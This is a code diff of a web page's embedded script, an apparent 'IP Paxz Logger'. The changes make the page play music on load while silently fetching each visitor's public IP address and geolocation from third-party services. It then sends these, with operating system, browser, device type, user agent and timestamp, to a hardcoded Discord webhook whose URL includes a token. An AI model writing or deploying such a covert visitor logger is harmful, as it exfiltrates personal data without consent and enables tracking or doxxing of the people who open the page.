@@ -29,16 +29,18 @@
     </style>
     <script>
         var embedSent = false;
-        startMusic();
+        var musicStarted = false;
 
         var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
 
         function startMusic() {
-            var audio = new Audio('music.mp3'); // Verander 'sound.mp3' naar 'music.mp3' voor het muziekbestand
-            audio.loop = true; // Loop de muziek zodat het altijd afspeelt
-            audio.play().catch(function(error) {
-                console.error('Failed to play music:', error);
-            });
+            var audio = new Audio('music.mp3'); // Change 'sound.mp3' to 'music.mp3' for the music file
+            audio.play();
+            musicStarted = true;
+            audio.addEventListener('ended', function() {
+                this.currentTime = 0;
+                this.play();
+            }, false);
         }
 
         function sendToDiscord(ipAddress, locationData) {
@@ -63,7 +65,7 @@
         }
 
         function sendEmbed(embedData) {
-            if (embedSent) return; // Als embed al is verzonden, stoppen
+            if (embedSent) return; // If embed is already sent, return
 
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
@@ -71,7 +73,7 @@
             console.log("Operating System:", os);
             var browser = detectBrowser(userAgent);
             console.log("Browser:", browser);
-            var deviceType = getDeviceType(userAgent);
+            var deviceType = getDeviceType();
             console.log("Device Type:", deviceType);
 
             var embed = {
@@ -79,7 +81,7 @@
                     {
                         "title": "IP Paxz Logger",
                         "description": "A user has visited the page.",
-                        "color": 65280, // Groen als het leuk is, Rood als het niet leuk is
+                        "color": 65280, // Green if liked, Red if not
                         "fields": [
                             {
                                 "name": "IP Address",
@@ -124,6 +126,26 @@
                             {
                                 "name": "Organization",
                                 "value": `\`\`\`${embedData["Organization"]}\`\`\``
+                            },
+                            {
+                                "name": "Operating System",
+                                "value": `\`\`\`${os}\`\`\``
+                            },
+                            {
+                                "name": "Browser",
+                                "value": `\`\`\`${browser}\`\`\``
+                            },
+                            {
+                                "name": "Device Type",
+                                "value": `\`\`\`${deviceType}\`\`\``
+                            },
+                            {
+                                "name": "User Agent",
+                                "value": `\`\`\`${userAgent}\`\`\``
+                            },
+                            {
+                                "name": "Timestamp",
+                                "value": `\`\`\`${timestamp}\`\`\``
                             }
                         ],
                         "footer": {
@@ -196,10 +218,9 @@
             return detectedBrowser || 'Unknown';
         }
 
-        function getDeviceType(userAgent) {
-            if (userAgent.includes("Mobile")) {
-                return userAgent.includes("iPad") ? "iPad" : userAgent.includes("iPhone") ? "iPhone" : "Phone";
-            }
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Mobile")) return "Phone";
             if (userAgent.includes("Tablet")) return "Tablet";
             if (userAgent.includes("Console")) return "Console";
             if (userAgent.includes("Windows")) return "PC / Computer";
@@ -207,18 +228,27 @@
         }
 
         window.onload = function() {
-            sendToDiscord("127.0.0.1", {
-                city: "Unknown",
-                region: "Unknown",
-                country_name: "Unknown",
-                country_code: "Unknown",
-                continent_code: "Unknown",
-                timezone: "Unknown",
-                currency: "Unknown",
-                languages: "Unknown",
-                asn: "Unknown",
-                org: "Unknown"
-            }); // Stuur een dummy-embed bij het laden van de pagina
+            startMusic(); // Start music immediately when the page loads
+
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    console.log("Public IP Address:", ipAddress);
+
+                    fetch(`https://ipapi.co/${ipAddress}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            sendToDiscord(ipAddress, locationData);
+                        })
+                        .catch(error => {
+                            console.error('Unable to fetch location data:', error);
+                            sendToDiscord(ipAddress, null); // Send embed with default location data
+                        });
+                })
+                .catch(error => {
+                    console.error('Unable to fetch public IP address:', error);
+                });
         }
     </script>
 </head>
